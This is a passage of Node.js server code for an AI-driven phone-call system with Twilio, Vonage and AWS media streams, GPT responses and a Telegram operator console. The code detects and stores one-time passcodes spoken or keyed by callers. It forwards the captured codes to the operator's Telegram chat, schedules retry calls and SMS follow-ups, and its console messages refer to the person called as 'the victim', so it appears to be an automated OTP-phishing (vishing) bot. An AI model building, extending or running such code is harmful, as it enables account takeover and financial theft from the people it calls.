            console.error("Vonage websocket DTMF handling error:", error);
          });
          return;
        }
        if (parsed?.event === "websocket:closed") {
          ws.close();
        }
      } catch {
        // ignore non-JSON
      }
    });

    ws.on("close", async () => {
      const session = activeCalls.get(callSid);
      if (session?.startTime) {
        await handleCallEnd(callSid, session.startTime);
      }
      activeCalls.delete(callSid);
      if (digitService) {
        digitService.clearCallState(callSid);
      }
      clearSpeechTicks(callSid);
      clearGptQueue(callSid);
      clearNormalFlowState(callSid);
      clearCallEndLock(callSid);
      clearSilenceTimer(callSid);
      sttFallbackCalls.delete(callSid);
      streamTimeoutCalls.delete(callSid);
    });

    // Send first message once stream is ready
    const initialExpectation = digitService?.getExpectation(callSid);
    const firstMessage =
      callConfig?.first_message ||
      (initialExpectation
        ? digitService.buildDigitPrompt(initialExpectation)
        : "");
    if (firstMessage) {
      ttsService.generate(
        { partialResponseIndex: null, partialResponse: firstMessage },
        0,
      );
      webhookService.recordTranscriptTurn(callSid, "agent", firstMessage);
      if (digitService?.hasExpectation(callSid)) {
        digitService.markDigitPrompted(callSid, gptService, 0, "dtmf", {
          allowCallEnd: true,
          prompt_text: firstMessage,
        });
        digitService.scheduleDigitTimeout(callSid, gptService, 0);
      }
      scheduleSilenceTimer(callSid);
    }
  } catch (error) {
    console.error("Vonage websocket error:", error);
    ws.close();
  }
});

// AWS websocket media handler (external audio forwarder -> Deepgram -> GPT -> Polly)
app.ws("/aws/stream", (ws, req) => {
  try {
    const callSid = req.query?.callSid;
    const contactId = req.query?.contactId;
    if (!callSid || !contactId) {
      ws.close();
      return;
    }

    const awsWebhookMode = String(config.aws?.webhookValidation || "warn")
      .toLowerCase()
      .trim();
    if (awsWebhookMode !== "off") {
      const authResult = verifyAwsStreamAuth(callSid, req);
      if (!authResult.ok) {
        console.warn("AWS websocket auth failed", {
          callSid,
          contactId,
          reason: authResult.reason || "unknown",
        });
        if (awsWebhookMode === "strict") {
          ws.close();
          return;
        }
      }
    }

    const callConfig = callConfigurations.get(callSid);
    if (!callConfig) {
      ws.close();
      return;
    }

    if (!callConfig.provider_metadata) {
      callConfig.provider_metadata = {};
    }
    if (!callConfig.provider_metadata.contact_id) {
      callConfig.provider_metadata.contact_id = contactId;
    }
    awsContactMap.set(contactId, callSid);

    const sampleRate = Number(req.query?.sampleRate) || 16000;
    const encoding = req.query?.encoding || "pcm";

    const transcriptionService = new TranscriptionService({
      encoding: encoding,
      sampleRate: sampleRate,
    });

    const handleSttFailure = async (tag, error) => {
      if (!callSid) return;
      console.error(
        `STT failure (${tag}) for ${callSid}`,
        error?.message || error || "",
      );
      const session = activeCalls.get(callSid);
      await activateDtmfFallback(
        callSid,
        session?.callConfig || callConfig,
        session?.gptService,
        session?.interactionCount || interactionCount,
        tag,
      );
    };

    transcriptionService.on("error", (error) => {
      handleSttFailure("stt_error", error);
    });
    transcriptionService.on("close", () => {
      handleSttFailure("stt_closed");
    });

    const sessionPromise = ensureAwsSession(callSid);
    let interactionCount = 0;

    transcriptionService.on("utterance", (text) => {
      clearSilenceTimer(callSid);
      if (text && text.trim().length > 0) {
        webhookService
          .setLiveCallPhase(callSid, "user_speaking")
          .catch(() => {});
      }
    });

    transcriptionService.on("transcription", async (text) => {
      if (!text) return;
      clearSilenceTimer(callSid);
      const session = await sessionPromise;
      const isDigitIntent = session?.callConfig?.digit_intent?.mode === "dtmf";
      const captureActive = isCaptureActiveConfig(session?.callConfig);
      const otpContext = digitService.getOtpContext(text, callSid);
      try {
        await db.addTranscript({
          call_sid: callSid,
          speaker: "user",
          message: otpContext.raw,
          interaction_count: interactionCount,
        });
        await db.updateCallState(callSid, "user_spoke", {
          message: otpContext.raw,
          interaction_count: interactionCount,
          otp_detected: otpContext.otpDetected,
          last_collected_code: otpContext.codes?.slice(-1)[0] || null,
          collected_codes: otpContext.codes?.join(", ") || null,
        });
      } catch (dbError) {
        console.error("Database error adding user transcript:", dbError);
      }

      webhookService.recordTranscriptTurn(callSid, "user", otpContext.raw);
      if (
        (isDigitIntent || captureActive) &&
        otpContext.codes &&
        otpContext.codes.length &&
        digitService?.hasExpectation(callSid)
      ) {
        const activeExpectation = digitService.getExpectation(callSid);
        const progress = digitService.formatOtpForDisplay(
          otpContext.codes[otpContext.codes.length - 1],
          "progress",
          activeExpectation?.max_digits,
        );
        webhookService.addLiveEvent(callSid, `🔢 ${progress}`, { force: true });
        const collection = digitService.recordDigits(
          callSid,
          otpContext.codes[otpContext.codes.length - 1],
          {
            timestamp: Date.now(),
            source: "spoken",
            full_input: true,
            attempt_id: activeExpectation?.attempt_id || null,
            plan_id: activeExpectation?.plan_id || null,
            plan_step_index: activeExpectation?.plan_step_index || null,
          },
        );
        await digitService.handleCollectionResult(
          callSid,
          collection,
          session.gptService,
          interactionCount,
          "spoken",
          { allowCallEnd: true },
        );
      }
      if (captureActive) {
        return;
      }

      if (
        shouldCloseConversation(otpContext.maskedForGpt) &&
        interactionCount >= 1
      ) {
        await speakAndEndCall(
          callSid,
          CALL_END_MESSAGES.user_goodbye,
          "user_goodbye",
        );
        interactionCount += 1;
        if (session) {
          session.interactionCount = interactionCount;
        }
        return;
      }

      const getInteractionCount = () => interactionCount;
      const setInteractionCount = (nextCount) => {
        interactionCount = nextCount;
        if (session) {
          session.interactionCount = nextCount;
        }
      };
      if (isDigitIntent) {
        await enqueueGptTask(callSid, async () => {
          const currentCount = interactionCount;
          try {
            await session.gptService.completion(
              otpContext.maskedForGpt,
              currentCount,
            );
          } catch (gptError) {
            console.error("GPT completion error:", gptError);
            webhookService.addLiveEvent(callSid, "⚠️ GPT error, retrying", {
              force: true,
            });
          }
          setInteractionCount(currentCount + 1);
        });
        return;
      }
      await processNormalFlowTranscript(
        callSid,
        otpContext.maskedForGpt,
        session.gptService,
        getInteractionCount,
        setInteractionCount,
      );
    });

    ws.on("message", (data) => {
      if (!data) return;
      if (Buffer.isBuffer(data)) {
        transcriptionService.sendBuffer(data);
        return;
      }
      const str = data.toString();
      try {
        const payload = JSON.parse(str);
        if (payload?.audio) {
          transcriptionService.send(payload.audio);
        }
      } catch {
        // ignore non-JSON text frames
      }
    });

    ws.on("close", async () => {
      const session = activeCalls.get(callSid);
      if (session?.startTime) {
        await handleCallEnd(callSid, session.startTime);
      }
      activeCalls.delete(callSid);
      if (digitService) {
        digitService.clearCallState(callSid);
      }
      clearGptQueue(callSid);
      clearNormalFlowState(callSid);
      clearCallEndLock(callSid);
      clearSilenceTimer(callSid);
      sttFallbackCalls.delete(callSid);
      streamTimeoutCalls.delete(callSid);
    });

    recordCallStatus(callSid, "in-progress", "call_in_progress").catch(
      () => {},
    );
  } catch (error) {
    console.error("AWS websocket error:", error);
    ws.close();
  }
});

// Enhanced call end handler with adaptation analytics
async function handleCallEnd(callSid, callStartTime) {
  try {
    const callEndTime = new Date();
    const duration = Math.round((callEndTime - callStartTime) / 1000);
    for (const key of gatherEventDedupe.keys()) {
      if (key.startsWith(`${callSid}:`)) {
        gatherEventDedupe.delete(key);
      }
    }
    clearGptQueue(callSid);
    clearNormalFlowState(callSid);
    clearSpeechTicks(callSid);
    sttFallbackCalls.delete(callSid);
    streamTimeoutCalls.delete(callSid);
    clearFirstMediaWatchdog(callSid);
    streamFirstMediaSeen.delete(callSid);
    streamLastMediaAt.delete(callSid);
    sttLastFrameAt.delete(callSid);
    streamWatchdogState.delete(callSid);
    streamStartSeen.delete(callSid);
    streamAuthBypass.delete(callSid);
    streamRetryState.delete(callSid);
    voiceAgentFallbackAttempts.delete(callSid);
    clearKeypadCallState(callSid);
    purgeStreamStatusDedupe(callSid);
    purgeCallStatusDedupe(callSid);
    callLifecycle.delete(callSid);
    const lifecycleTimer = callLifecycleCleanupTimers.get(callSid);
    if (lifecycleTimer) {
      clearTimeout(lifecycleTimer);
      callLifecycleCleanupTimers.delete(callSid);
    }
    const terminalStatuses = new Set([
      "completed",
      "no-answer",
      "no_answer",
      "busy",
      "failed",
      "canceled",
    ]);
    const normalizeStatus = (value) =>
      String(value || "")
        .toLowerCase()
        .replace(/_/g, "-");
    const initialCallDetails = await db.getCall(callSid);
    const persistedStatus = normalizeStatus(
      initialCallDetails?.status || initialCallDetails?.twilio_status,
    );
    const finalStatus = terminalStatuses.has(persistedStatus)
      ? persistedStatus
      : "completed";
    const notificationMap = {
      completed: "call_completed",
      "no-answer": "call_no_answer",
      busy: "call_busy",
      failed: "call_failed",
      canceled: "call_canceled",
    };
    const notificationType = notificationMap[finalStatus] || "call_completed";
    if (digitService) {
      digitService.clearCallState(callSid);
    }
    clearCallEndLock(callSid);
    clearSilenceTimer(callSid);

    const transcripts = (await db.getCallTranscripts(callSid)) || [];
    const summary = generateCallSummary(transcripts, duration);
    const digitEvents = await db.getCallDigits(callSid).catch(() => []);
    const digitSummary = buildDigitSummary(digitEvents);
    const digitFunnel = buildDigitFunnelStats(digitEvents);

    // Get personality adaptation data
    const callSession = activeCalls.get(callSid);
    let adaptationAnalysis = {};

    if (callSession && callSession.gptService) {
      const conversationAnalysis =
        callSession.gptService.getConversationAnalysis();
      adaptationAnalysis = {
        personalityChanges: conversationAnalysis.personalityChanges,
        finalPersonality: conversationAnalysis.currentPersonality,
        adaptationEffectiveness:
          conversationAnalysis.personalityChanges /
          Math.max(conversationAnalysis.totalInteractions / 10, 1),
        businessContext: callSession.functionSystem?.context || {},
      };
    }

    await db.updateCallStatus(callSid, finalStatus, {
      ended_at: callEndTime.toISOString(),
      duration: duration,
      call_summary: summary.summary,
      ai_analysis: JSON.stringify({
        ...summary.analysis,
        adaptation: adaptationAnalysis,
      }),
      digit_summary: digitSummary.summary,
      digit_count: digitSummary.count,
    });

    await db.updateCallState(callSid, "call_ended", {
      end_time: callEndTime.toISOString(),
      duration: duration,
      total_interactions: transcripts.length,
      personality_adaptations: adaptationAnalysis.personalityChanges || 0,
    });
    if (digitFunnel) {
      await db
        .updateCallState(callSid, "digit_funnel_summary", digitFunnel)
        .catch(() => {});
    }

    const callDetails = await db.getCall(callSid);

    // Create enhanced webhook notification for completion
    if (callDetails && callDetails.user_chat_id) {
      if (callDetails.last_otp) {
        const masked = digitService
          ? digitService.formatOtpForDisplay(callDetails.last_otp, "masked")
          : callDetails.last_otp;
        const otpMsg = `🔐 ${masked} (call ${callSid.slice(-6)})`;
        try {
          await webhookService.sendTelegramMessage(
            callDetails.user_chat_id,
            otpMsg,
          );
        } catch (err) {
          console.error("Error sending OTP to user:", err);
        }
      }

      if (digitEvents && digitEvents.length) {
        const lines = digitEvents
          .filter((d) => d.digits)
          .map((d) => {
            const label = DIGIT_PROFILE_LABELS[d.profile] || d.profile;
            const display = digitService
              ? digitService.formatDigitsGeneral(d.digits, null, "notify")
              : d.digits;
            const src = d.source || "unknown";
            return `• ${label} [${src}]: ${display}`;
          });
        // Suppressed verbose digit timeline to avoid leaking sensitive digits in notifications
      }
      await db.createEnhancedWebhookNotification(
        callSid,
        notificationType,
        callDetails.user_chat_id,
      );

      // Schedule transcript notification with delay
      if (finalStatus === "completed") {
        setTimeout(async () => {
          try {
            await db.createEnhancedWebhookNotification(
              callSid,
              "call_transcript",
              callDetails.user_chat_id,
            );
          } catch (transcriptError) {
            console.error(
              "Error creating transcript notification:",
              transcriptError,
            );
          }
        }, 2000);
      }
    }

    const inboundConfig = callConfigurations.get(callSid);
    if (inboundConfig?.inbound && callDetails?.user_chat_id) {
      const normalizedStatus = normalizeCallStatus(
        callDetails.status || callDetails.twilio_status || finalStatus,
      );
      webhookService
        .sendCallStatusUpdate(
          callSid,
          normalizedStatus,
          callDetails.user_chat_id,
          {
            duration,
            ring_duration: callDetails.ring_duration,
            answered_by: callDetails.answered_by,
            status_source: "stream",
          },
        )
        .catch((err) => console.error("Inbound terminal update error:", err));
    }

    console.log(`Enhanced adaptive call ${callSid} ended (${finalStatus})`);
    console.log(
      `Duration: ${duration}s | Messages: ${transcripts.length} | Adaptations: ${adaptationAnalysis.personalityChanges || 0}`,
    );
    if (adaptationAnalysis.finalPersonality) {
      console.log(`Final personality: ${adaptationAnalysis.finalPersonality}`);
    }

    // Log service health
    await db.logServiceHealth("call_system", `call_${finalStatus}`, {
      call_sid: callSid,
      duration: duration,
      interactions: transcripts.length,
      adaptations: adaptationAnalysis.personalityChanges || 0,
    });
  } catch (error) {
    console.error("Error handling enhanced adaptive call end:", error);
    voiceAgentFallbackAttempts.delete(callSid);

    // Log error to service health
    try {
      await db.logServiceHealth("call_system", "error", {
        operation: "handle_call_end",
        call_sid: callSid,
        error: error.message,
      });
    } catch (logError) {
      console.error("Failed to log service health error:", logError);
    }
  }
}

function generateCallSummary(transcripts, duration) {
  if (!transcripts || transcripts.length === 0) {
    return {
      summary: "No conversation recorded",
      analysis: { total_messages: 0, user_messages: 0, ai_messages: 0 },
    };
  }

  const userMessages = transcripts.filter((t) => t.speaker === "user");
  const aiMessages = transcripts.filter((t) => t.speaker === "ai");

  const analysis = {
    total_messages: transcripts.length,
    user_messages: userMessages.length,
    ai_messages: aiMessages.length,
    duration_seconds: duration,
    conversation_turns: Math.max(userMessages.length, aiMessages.length),
  };

  const summary =
    `Enhanced adaptive call completed with ${transcripts.length} messages over ${Math.round(duration / 60)} minutes. ` +
    `User spoke ${userMessages.length} times, AI responded ${aiMessages.length} times.`;

  return { summary, analysis };
}

async function handleTwilioIncoming(req, res) {
  try {
    if (!requireValidTwilioSignature(req, res, "/incoming")) {
      return;
    }
    const host = resolveHost(req);
    if (!host) {
      return res.status(500).send("Server hostname not configured");
    }
    const maskedFrom = maskPhoneForLog(req.body?.From);
    const maskedTo = maskPhoneForLog(req.body?.To);
    console.log(
      `Incoming call webhook (${req.method}) from ${maskedFrom} to ${maskedTo} host=${host}`,
    );
    const callSid = req.body?.CallSid;
    const directionRaw = req.body?.Direction || req.body?.direction;
    const isOutbound = isOutboundTwilioDirection(directionRaw);
    const directionLabel = isOutbound ? "outbound" : "inbound";
    if (callSid) {
      callDirections.set(callSid, directionLabel);
      if (!isOutbound) {
        await refreshInboundDefaultScript();
        const callRecord = await ensureCallRecord(
          callSid,
          req.body,
          "incoming_webhook",
          {
            provider: "twilio",
            inbound: true,
          },
        );
        const chatId = callRecord?.user_chat_id || config.telegram?.adminChatId;
        const callerLookup = callRecord?.phone_number
          ? normalizePhoneForFlag(callRecord.phone_number) ||
            callRecord.phone_number
          : null;
        const callerFlag = callerLookup
          ? await db.getCallerFlag(callerLookup).catch(() => null)
          : null;
        if (callerFlag?.status !== "allowed") {
          const rateLimit = shouldRateLimitInbound(req, req.body || {});
          if (rateLimit.limited) {
            await db
              .updateCallState(callSid, "inbound_rate_limited", {
                at: new Date().toISOString(),
                key: rateLimit.key,
                count: rateLimit.count,
                reset_at: rateLimit.resetAt,
              })
              .catch(() => {});
            if (chatId) {
              webhookService
                .sendCallStatusUpdate(callSid, "failed", chatId, {
                  status_source: "rate_limit",
                })
                .catch((err) =>
                  console.error("Inbound rate limit update error:", err),
                );
              webhookService.addLiveEvent(
                callSid,
                "⛔ Inbound rate limit reached",
                { force: true },
              );
            }
            if (
              config.inbound?.rateLimitSmsEnabled &&
              callRecord?.phone_number
            ) {
              try {
                const smsBody = buildInboundSmsBody(
                  callRecord,
                  await db
                    .getLatestCallState(callSid, "call_created")
                    .catch(() => null),
                );
                await smsService.sendSMS(callRecord.phone_number, smsBody);
                await db
                  .updateCallState(callSid, "rate_limit_sms_sent", {
                    at: new Date().toISOString(),
                  })
                  .catch(() => {});
              } catch (smsError) {
                console.error("Failed to send rate-limit SMS:", smsError);
              }
            }
            if (
              config.inbound?.rateLimitCallbackEnabled &&
              callRecord?.phone_number
            ) {
              try {
                const callState = await db
                  .getLatestCallState(callSid, "call_created")
                  .catch(() => null);
                const payload = buildCallbackPayload(callRecord, callState);
                const delayMin = Math.max(
                  1,
                  Number(config.inbound?.callbackDelayMinutes) || 15,
                );
                const runAt = new Date(
                  Date.now() + delayMin * 60 * 1000,
                ).toISOString();
                await scheduleCallJob("callback_call", payload, runAt);
                await db
                  .updateCallState(callSid, "callback_scheduled", {
                    at: new Date().toISOString(),
                    run_at: runAt,
                  })
                  .catch(() => {});
              } catch (callbackError) {
                console.error("Failed to schedule callback:", callbackError);
              }
            }
            const limitedResponse = new VoiceResponse();
            limitedResponse.say(
              "We are experiencing high call volume. Please try again later.",
            );
            limitedResponse.hangup();
            res.type("text/xml");
            res.end(limitedResponse.toString());
            return;
          }
        }
        if (callerFlag?.status === "blocked") {
          if (chatId) {
            webhookService
              .sendCallStatusUpdate(callSid, "failed", chatId, {
                status_source: "blocked",
              })
              .catch((err) =>
                console.error("Blocked caller update error:", err),
              );
          }
          await db
            .updateCallState(callSid, "caller_blocked", {
              at: new Date().toISOString(),
              phone_number: callerLookup || callRecord?.phone_number || null,
              status: callerFlag.status,
              note: callerFlag.note || null,
            })
            .catch(() => {});
          const blockedResponse = new VoiceResponse();
          blockedResponse.say("We cannot take your call at this time.");
          blockedResponse.hangup();
          res.type("text/xml");
          res.end(blockedResponse.toString());
          return;
        }
        if (chatId) {
          webhookService
            .sendCallStatusUpdate(callSid, "ringing", chatId, {
              status_source: "inbound",
            })
            .catch((err) =>
              console.error("Inbound ringing update error:", err),
            );
        }

        const gateStatus =
          webhookService.getInboundGate?.(callSid)?.status || "pending";
        const answerOverride = ["1", "true", "yes"].includes(
          String(req.query?.answer || "").toLowerCase(),
        );
        if (gateStatus === "declined") {
          const declinedResponse = new VoiceResponse();
          declinedResponse.hangup();
          res.type("text/xml");
          res.end(declinedResponse.toString());
          return;
        }
        if (!answerOverride && gateStatus !== "answered") {
          const holdTwiml = buildInboundHoldTwiml(host);
          res.type("text/xml");
          res.end(holdTwiml);
          return;
        }
      }
      const timeoutMs = 30000;
      const timeout = setTimeout(async () => {
        pendingStreams.delete(callSid);
        if (activeCalls.has(callSid)) {
          return;
        }
        let statusValue = "unknown";
        try {
          const callDetails = await db?.getCall?.(callSid);
          statusValue = normalizeCallStatus(
            callDetails?.status || callDetails?.twilio_status,
          );
          if (
            !callDetails?.started_at &&
            !["answered", "in-progress", "completed"].includes(statusValue)
          ) {
            console.warn(
              `Stream not established for ${callSid} yet (status=${statusValue || "unknown"}).`,
            );
            return;
          }
        } catch (err) {
          console.warn(
            `Stream status check failed for ${callSid}: ${err?.message || err}`,
          );
        }
        console.warn(
          `Stream not established for ${callSid} after ${timeoutMs}ms (status=${statusValue || "unknown"}).`,
        );
        webhookService.addLiveEvent(
          callSid,
          "⚠️ Stream not connected yet. Attempting recovery…",
          { force: true },
        );
        void handleStreamTimeout(callSid, host, {
          allowHangup: false,
          reason: "stream_not_connected",
        });
      }, timeoutMs);
      pendingStreams.set(callSid, timeout);
    }
    const response = new VoiceResponse();
    if (!isOutbound) {
      const preconnectMessage = String(
        config.inbound?.preConnectMessage || "",
      ).trim();
      const pauseSeconds = Math.max(
        0,
        Math.min(
          10,
          Math.round(Number(config.inbound?.preConnectPauseSeconds) || 0),
        ),
      );
      if (preconnectMessage) {
        response.say(preconnectMessage);
        if (pauseSeconds > 0) {
          response.pause({ length: pauseSeconds });
        }
      }
    }
    const connect = response.connect();
    const streamParams = new URLSearchParams();
    const streamParameters = {};
    const inboundFallbackRequested = ["1", "true", "yes"].includes(
      String(req.query?.voice_agent_fallback || req.query?.va_legacy || "")
        .toLowerCase()
        .trim(),
    );
    if (req.body?.From) streamParams.set("from", String(req.body.From));
    if (req.body?.To) streamParams.set("to", String(req.body.To));
    streamParams.set("direction", directionLabel);
    if (req.body?.From) streamParameters.from = String(req.body.From);
    if (req.body?.To) streamParameters.to = String(req.body.To);
    streamParameters.direction = directionLabel;
    if (inboundFallbackRequested) {
      streamParams.set("va_legacy", "1");
      streamParameters.va_legacy = "1";
      if (callSid) {
        db.updateCallState(callSid, "voice_agent_fallback_active", {
          at: new Date().toISOString(),
          source: "incoming_redirect",
        }).catch(() => {});
      }
    }
    if (callSid && config.streamAuth?.secret) {
      const timestamp = String(Date.now());
      const token = buildStreamAuthToken(callSid, timestamp);
      if (token) {
        streamParams.set("token", token);
        streamParams.set("ts", timestamp);
        streamParameters.token = token;
        streamParameters.ts = timestamp;
      }
    }
    const streamQuery = streamParams.toString();
    const streamUrl = `wss://${host}/connection${streamQuery ? `?${streamQuery}` : ""}`;
    // Request both audio + DTMF events from Twilio Media Streams
    const streamOptions = {
      url: streamUrl,
      track: TWILIO_STREAM_TRACK,
      statusCallback: `https://${host}/webhook/twilio-stream`,
      statusCallbackMethod: "POST",
      statusCallbackEvent: ["start", "end"],
    };
    if (Object.keys(streamParameters).length) {
      streamOptions.parameters = streamParameters;
    }
    connect.stream(streamOptions);

    res.type("text/xml");
    res.end(response.toString());
  } catch (err) {
    console.log(err);
    res.status(500).send("Error");
  }
}

// Incoming endpoint used by Twilio to connect the call to our websocket stream
app.post("/incoming", handleTwilioIncoming);
app.get("/incoming", handleTwilioIncoming);

// Telegram callback webhook (live console actions)
app.post("/webhook/telegram", async (req, res) => {
  try {
    if (!requireValidTelegramWebhook(req, res, "/webhook/telegram")) {
      return;
    }
    const update = req.body;
    res.status(200).send("OK");

    if (!update) return;
    const cb = update.callback_query;
    if (!cb?.data) return;

    const parts = cb.data.split(":");
    const prefix = parts[0];
    let action = null;
    let callSid = null;
    if (prefix === "lc") {
      action = parts[1];
      callSid = parts[2];
    } else if (prefix === "recap" || prefix === "retry") {
      action = parts[1];
      callSid = parts[2];
    } else {
      callSid = parts[1];
    }
    if (!prefix || !callSid || (prefix === "lc" && !action)) {
      webhookService
        .answerCallbackQuery(cb.id, "Unsupported action")
        .catch(() => {});
      return;
    }

    if (prefix === "retry") {
      const retryAction = action;
      try {
        const callRecord = await db.getCall(callSid).catch(() => null);
        const chatId = cb.message?.chat?.id;
        if (!callRecord) {
          webhookService
            .answerCallbackQuery(cb.id, "Call not found")
            .catch(() => {});
          return;
        }
        if (
          callRecord.user_chat_id &&
          chatId &&
          String(callRecord.user_chat_id) !== String(chatId)
        ) {
          webhookService
            .answerCallbackQuery(cb.id, "Not authorized for this call")
            .catch(() => {});
          return;
        }

        if (retryAction === "sms") {
          if (!callRecord?.phone_number) {
            webhookService
              .answerCallbackQuery(cb.id, "No phone number on record")
              .catch(() => {});
            return;
          }
          const callState = await db
            .getLatestCallState(callSid, "call_created")
            .catch(() => null);
          const smsBody = buildRetrySmsBody(callRecord, callState);
          try {
            await smsService.sendSMS(callRecord.phone_number, smsBody);
            webhookService
              .answerCallbackQuery(cb.id, "SMS sent")
              .catch(() => {});
            await webhookService.sendTelegramMessage(
              chatId,
              "💬 Follow-up SMS sent to the victim.",
            );
          } catch (smsError) {
            webhookService
              .answerCallbackQuery(cb.id, "Failed to send SMS")
              .catch(() => {});
            await webhookService.sendTelegramMessage(
              chatId,
              `❌ Failed to send follow-up SMS: ${smsError.message || smsError}`,
            );
          }
          return;
        }

        const payload = await buildRetryPayload(callSid);
        const delayMs = retryAction === "15m" ? 15 * 60 * 1000 : 0;

        if (delayMs > 0) {
          const runAt = new Date(Date.now() + delayMs).toISOString();
          await scheduleCallJob("outbound_call", payload, runAt);
          await db
            .updateCallState(callSid, "retry_scheduled", {
              at: new Date().toISOString(),
              run_at: runAt,
            })
            .catch(() => {});
          webhookService
            .answerCallbackQuery(cb.id, "Retry scheduled")
            .catch(() => {});
          await webhookService.sendTelegramMessage(
            chatId,
            `⏲ Retry scheduled in 15 minutes for ${formatContactLabel(payload)}.`,
          );
          return;
        }

        const retryResult = await placeOutboundCall(payload);
        webhookService
          .answerCallbackQuery(cb.id, "Retry started")
          .catch(() => {});
        await webhookService.sendTelegramMessage(
          chatId,
          `🔁 Retry started for ${formatContactLabel(payload)} (call ${retryResult.callId.slice(-6)}).`,
        );
      } catch (error) {
        webhookService
          .answerCallbackQuery(cb.id, "Retry failed")
          .catch(() => {});
        await webhookService.sendTelegramMessage(
          cb.message?.chat?.id,
          `❌ Retry failed: ${error.message || error}`,
        );
      }
      return;
    }

    if (prefix === "recap") {
      try {
        const callRecord = await db.getCall(callSid).catch(() => null);
        const chatId = cb.message?.chat?.id;
        if (
          callRecord?.user_chat_id &&
          chatId &&
          String(callRecord.user_chat_id) !== String(chatId)
        ) {
          webhookService
            .answerCallbackQuery(cb.id, "Not authorized for this call")
            .catch(() => {});
          return;
        }

        const recapAction = parts[1];
        if (recapAction === "skip") {
          webhookService.answerCallbackQuery(cb.id, "Skipped").catch(() => {});
          return;
        }

        if (recapAction === "sms") {
          if (!callRecord?.phone_number) {
            webhookService
              .answerCallbackQuery(cb.id, "No phone number on record")
              .catch(() => {});
            return;
          }

          const smsBody = buildRecapSmsBody(callRecord);
          try {
            await smsService.sendSMS(callRecord.phone_number, smsBody);
            webhookService
              .answerCallbackQuery(cb.id, "Recap sent via SMS")
              .catch(() => {});
            await webhookService.sendTelegramMessage(
              chatId,
              "📩 Recap sent via SMS to the victim.",
            );
          } catch (smsError) {
            webhookService
              .answerCallbackQuery(cb.id, "Failed to send SMS")
              .catch(() => {});
            await webhookService.sendTelegramMessage(
              chatId,
              `❌ Failed to send recap SMS: ${smsError.message || smsError}`,
            );
          }
          return;
        }
      } catch (error) {
        webhookService
          .answerCallbackQuery(cb.id, "Error handling recap")
          .catch(() => {});
      }
      return;
    }

    const callRecord = await db.getCall(callSid).catch(() => null);
    const chatId = cb.message?.chat?.id;
    if (
      callRecord?.user_chat_id &&
      chatId &&
      String(callRecord.user_chat_id) !== String(chatId)
    ) {
      webhookService
        .answerCallbackQuery(cb.id, "Not authorized for this call")
        .catch(() => {});
      return;
    }
    const callState = await db
      .getLatestCallState(callSid, "call_created")
      .catch(() => null);

    if (prefix === "tr") {
      webhookService
        .answerCallbackQuery(cb.id, "Sending transcript...")
        .catch(() => {});
      await webhookService.sendFullTranscript(
        callSid,
        chatId,
        cb.message?.message_id,
      );
      return;
    }

    if (prefix === "rca") {
      webhookService
        .answerCallbackQuery(cb.id, "Fetching recording…")
        .catch(() => {});
      try {
        await db.updateCallState(callSid, "recording_access_requested", {
          at: new Date().toISOString(),
        });
      } catch (stateError) {
        console.error("Failed to log recording access request:", stateError);
      }
      await webhookService.sendTelegramMessage(
        chatId,
        "🎧 Recording is being prepared. You will receive it here if available.",
      );
      return;
    }

    if (action === "answer" || action === "decline") {
      webhookService
        .answerCallbackQuery(cb.id, "Answer/decline is managed by admin controls")
        .catch(() => {});
      return;
    }

    if (action === "privacy") {
      const redacted = webhookService.togglePreviewRedaction(callSid);
      if (redacted === null) {
        webhookService
          .answerCallbackQuery(cb.id, "Console not active")
          .catch(() => {});
        return;
      }
      const label = redacted ? "Preview hidden" : "Preview revealed";
      await logConsoleAction(callSid, "privacy", { redacted });
      webhookService.answerCallbackQuery(cb.id, label).catch(() => {});
      return;
    }

    if (action === "actions") {
      const expanded = webhookService.toggleConsoleActions(callSid);
      if (expanded === null) {
        webhookService
          .answerCallbackQuery(cb.id, "Console not active")
          .catch(() => {});
        return;
      }
      webhookService
        .answerCallbackQuery(
          cb.id,
          expanded ? "Actions expanded" : "Actions hidden",
        )
        .catch(() => {});
      return;
    }

    if (action === "sms") {
      if (!callRecord?.phone_number) {
        webhookService
          .answerCallbackQuery(cb.id, "No phone number on record")
          .catch(() => {});
        return;
      }
      webhookService.lockConsoleButtons(callSid, "Sending SMS…");
      try {
        const inbound = callState?.inbound === true;
        const smsBody = inbound
          ? buildInboundSmsBody(callRecord, callState)
          : buildRetrySmsBody(callRecord, callState);
        await smsService.sendSMS(callRecord.phone_number, smsBody);
        webhookService.addLiveEvent(callSid, "💬 Follow-up SMS sent", {
          force: true,
        });
        await logConsoleAction(callSid, "sms", {
          inbound,
          to: callRecord.phone_number,
        });
        webhookService.answerCallbackQuery(cb.id, "SMS sent").catch(() => {});
      } catch (smsError) {
        webhookService
          .answerCallbackQuery(cb.id, "Failed to send SMS")
          .catch(() => {});
        await webhookService.sendTelegramMessage(
          chatId,
          `❌ Failed to send follow-up SMS: ${smsError.message || smsError}`,
        );
      } finally {
        setTimeout(() => webhookService.unlockConsoleButtons(callSid), 1000);
      }
      return;
    }

    if (action === "callback") {
      if (!callRecord?.phone_number) {
        webhookService
          .answerCallbackQuery(cb.id, "No phone number on record")
          .catch(() => {});
        return;
      }
      webhookService.lockConsoleButtons(callSid, "Scheduling…");
      try {
        const delayMin = Math.max(
          1,
          Number(config.inbound?.callbackDelayMinutes) || 15,
        );
        const runAt = new Date(Date.now() + delayMin * 60 * 1000).toISOString();
        const payload = buildCallbackPayload(callRecord, callState);
        await scheduleCallJob("callback_call", payload, runAt);
        webhookService.addLiveEvent(
          callSid,
          `⏲ Callback scheduled in ${delayMin}m`,
          { force: true },
        );
        await logConsoleAction(callSid, "callback_scheduled", {
          run_at: runAt,
        });
        webhookService
          .answerCallbackQuery(cb.id, "Callback scheduled")
          .catch(() => {});
      } catch (callbackError) {
        webhookService
          .answerCallbackQuery(cb.id, "Failed to schedule callback")
          .catch(() => {});
      } finally {
        setTimeout(() => webhookService.unlockConsoleButtons(callSid), 1000);
      }
      return;
    }

    if (action === "block" || action === "allow" || action === "spam") {
      if (!callRecord?.phone_number) {
        webhookService
          .answerCallbackQuery(cb.id, "No phone number on record")
          .catch(() => {});
        return;
      }
      const status =
        action === "block"
          ? "blocked"
          : action === "allow"
            ? "allowed"
            : "spam";
      const flagPhone =
        normalizePhoneForFlag(callRecord.phone_number) ||
        callRecord.phone_number;
      webhookService.lockConsoleButtons(callSid, "Saving…");
      try {
        await db.setCallerFlag(flagPhone, status, {
          updated_by: chatId,
          source: "telegram",
        });
        webhookService.setCallerFlag(callSid, status);
        webhookService.addLiveEvent(callSid, `📛 Caller marked ${status}`, {
          force: true,
        });
        await logConsoleAction(callSid, "caller_flag", {
          status,
          phone_number: flagPhone,
        });
        webhookService
